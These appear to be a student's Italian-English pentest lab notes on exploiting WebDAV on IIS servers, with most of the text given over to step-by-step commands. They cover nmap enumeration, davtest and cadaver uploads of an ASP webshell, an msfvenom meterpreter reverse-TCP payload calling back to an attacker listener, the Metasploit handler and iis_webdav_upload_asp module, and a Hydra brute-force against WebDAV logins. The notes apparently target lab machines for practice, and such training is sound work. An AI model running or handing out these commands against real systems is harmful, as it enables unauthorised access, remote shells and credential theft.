Implementazione su IIS Server per gestire da remoto i file presenti sull'IIS utilizzato come file server Tools utili for exploitation: davtest, cadaver Upload/Download files from a directory  In presenza di IIS cercare path /webDav/  davtest Tools: davtest -url <IP/webdav>  Cadaver Tools: Download/Upload/Read scripte for navigate in to /webDav/ put /usr/share/webshells/asp/webshell.asp  WebDav - Metasploit Mfsvenom (generator payload) -p (payload) windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 –f asp > shell.asp


```
### WebDAV - Step Exploitation
- Check wheather webDAV has been configured to run on the IIS web server

- Bruteforce the credentials for login

- Upload a malicious .asp file that can execute arbitary commands or obtain a reverse shell on the target


Tools : Davtest, cadaver
- DavTest: Utility che testa tutte le directory sul quale è possibile fare degli upload utilizzando Cadaver.
- Cadaver: cadaver is a command-line WebDAV client supports file upload, download, on-screen display, namespace operations.


> nmap -sV -sC 10.3.26.115
> nmap -p80 --script http-enum -sV 10.3.26.115
> Browser http://10.3.26.115/webdav/ - Login check


# WebDAV - davtest find out which file can be submitted:
> davtest -url <http://10.3.26.115/webdav>
> davtest -auth bob:password_123321 -url http://10.3.26.115/webdav

# WebDAV - cadaver
Download/Upload/Read scripte for navigate in to /webDav/:
> put /usr/share/webshells/asp/webshell.asp
> cadaver http://10.3.26.115/webdav
> dav:/webdav/> put /usr/share/webshells/asp/webshell.asp - file upload using cadaver


# WebDAV - Genero il Payload per ottenere una reverse shell Metasploit
Mfsvenom (generator payload) -p (payload) windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 –f asp > webshell.asp

# WebDav - Exploiting Accessing the backdoor: 
> http://10.3.26.115/webdav/webshell.asp
Now type your command on the box and run , find flag


### WebDAV  - Complete Exploitationwith Metasploit 

> davtest -auth bob:password_123321 -url http://10.4.18.218/webdav
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.4 LPORT=1234 -f asp > shell.asp
> cadaver http://10.4.18.218/webdav
> put /root/shell.asp
> service postgresql start && msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 10.10.80.4
> set LPORT 1234
> run
    
Browser http://10.4.18.218/webdav/shell.asp  
Got meterpreter session 
> sysinfo,getuid


# WebDav - Metasploit
use exploit/windows/iis/iis_webdav_upload_asp 
set RHOSTS 10.0.17.27 
set HttpUsername bob
set HttpPassword password_123321 
set PATH /webdav/metasploit%RAND%.asp
exploit




# WebDav - Hydra
> hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.26.115 http-get /webdav/




```